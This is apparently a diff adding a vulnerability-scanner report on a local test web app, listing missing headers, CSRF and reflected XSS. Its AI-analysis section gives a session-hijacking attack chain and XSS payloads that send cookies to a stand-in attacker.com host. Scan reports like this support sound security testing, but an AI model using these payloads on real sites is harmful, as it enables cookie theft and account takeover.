@@ -1,0 +1,164 @@
+{
+  "target": "http://localhost:8888",
+  "scan_time": "2026-04-13 13:47:52",
+  "duration": "0.1s",
+  "recon": {
+    "server": "Werkzeug/3.1.7 Python/3.11.0rc1",
+    "technologies": [
+      "PHP/7.4.3"
+    ],
+    "forms_count": 2,
+    "links_count": 3
+  },
+  "vulnerabilities": [
+    {
+      "type": "Missing Security Headers",
+      "url": "http://localhost:8888",
+      "parameter": "X-Frame-Options",
+      "payload": "N/A",
+      "evidence": "Header 'X-Frame-Options' not present in response",
+      "severity": "MEDIUM",
+      "description": "Clickjacking protection missing",
+      "cvss": 4.3
+    },
+    {
+      "type": "Missing Security Headers",
+      "url": "http://localhost:8888",
+      "parameter": "X-XSS-Protection",
+      "payload": "N/A",
+      "evidence": "Header 'X-XSS-Protection' not present in response",
+      "severity": "LOW",
+      "description": "XSS filter header missing",
+      "cvss": 3.1
+    },
+    {
+      "type": "Missing Security Headers",
+      "url": "http://localhost:8888",
+      "parameter": "X-Content-Type-Options",
+      "payload": "N/A",
+      "evidence": "Header 'X-Content-Type-Options' not present in response",
+      "severity": "LOW",
+      "description": "MIME sniffing protection missing",
+      "cvss": 3.1
+    },
+    {
+      "type": "Missing Security Headers",
+      "url": "http://localhost:8888",
+      "parameter": "Strict-Transport-Security",
+      "payload": "N/A",
+      "evidence": "Header 'Strict-Transport-Security' not present in response",
+      "severity": "MEDIUM",
+      "description": "HSTS not enforced",
+      "cvss": 5.3
+    },
+    {
+      "type": "Missing Security Headers",
+      "url": "http://localhost:8888",
+      "parameter": "Content-Security-Policy",
+      "payload": "N/A",
+      "evidence": "Header 'Content-Security-Policy' not present in response",
+      "severity": "MEDIUM",
+      "description": "CSP not configured",
+      "cvss": 5.3
+    },
+    {
+      "type": "Missing Security Headers",
+      "url": "http://localhost:8888",
+      "parameter": "Referrer-Policy",
+      "payload": "N/A",
+      "evidence": "Header 'Referrer-Policy' not present in response",
+      "severity": "LOW",
+      "description": "Referrer policy not set",
+      "cvss": 2.7
+    },
+    {
+      "type": "CSRF (Missing Token)",
+      "url": "http://localhost:8888/login",
+      "parameter": "form",
+      "payload": "N/A",
+      "evidence": "POST form without CSRF token",
+      "severity": "MEDIUM",
+      "description": "Form lacks CSRF protection. Cross-site request forgery possible.",
+      "cvss": 6.5
+    },
+    {
+      "type": "XSS (Reflected via Form)",
+      "url": "http://localhost:8888/search",
+      "parameter": "q",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "evidence": "Payload reflected in form response",
+      "severity": "HIGH",
+      "description": "XSS via form 'q'.",
+      "cvss": 7.4
+    }
+  ],
+  "ai_analysis": {
+    "overall_risk_level": "MEDIUM",
+    "overall_risk_score": 5.7,
+    "estimated_success_probability": "55%",
+    "attack_chain": "3. Deploy XSS payload to steal session cookies\n4. Hijack authenticated sessions via stolen cookies\n7. Craft CSRF payload to perform actions as authenticated user",
+    "custom_payloads": {
+      "XSS_Advanced": [
+        "<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">",
+        "<script>new Image().src=\"https://attacker.com/log?data=\"+btoa(document.cookie)</script>",
+        "\"><svg/onload=eval(atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\"))>"
+      ]
+    },
+    "recommendations": [
+      "Implement Content Security Policy (CSP)",
+      "Encode all user-supplied output",
+      "Implement CSRF tokens on all state-changing forms",
+      "Implement Web Application Firewall (WAF)",
+      "Regular penetration testing and security audits"
+    ],
+    "priority_targets": [
+      {
+        "type": "XSS (Reflected via Form)",
+        "url": "http://localhost:8888/search",
+        "parameter": "q",
+        "severity": "HIGH",
+        "exploit_difficulty": "Easy",
+        "impact": "Session hijacking"
+      },
+      {
+        "type": "Missing Security Headers",
+        "url": "http://localhost:8888",
+        "parameter": "X-Frame-Options",
+        "severity": "MEDIUM",
+        "exploit_difficulty": "Medium",
+        "impact": "Security bypass"
+      },
+      {
+        "type": "Missing Security Headers",
+        "url": "http://localhost:8888",
+        "parameter": "Strict-Transport-Security",
+        "severity": "MEDIUM",
+        "exploit_difficulty": "Medium",
+        "impact": "Security bypass"
+      },
+      {
+        "type": "Missing Security Headers",
+        "url": "http://localhost:8888",
+        "parameter": "Content-Security-Policy",
+        "severity": "MEDIUM",
+        "exploit_difficulty": "Medium",
+        "impact": "Security bypass"
+      },
+      {
+        "type": "CSRF (Missing Token)",
+        "url": "http://localhost:8888/login",
+        "parameter": "form",
+        "severity": "MEDIUM",
+        "exploit_difficulty": "Medium",
+        "impact": "Security bypass"
+      }
+    ],
+    "total_vulnerabilities": 8,
+    "severity_breakdown": {
+      "CRITICAL": 0,
+      "HIGH": 1,
+      "MEDIUM": 4,
+      "LOW": 3
+    }
+  }
+}
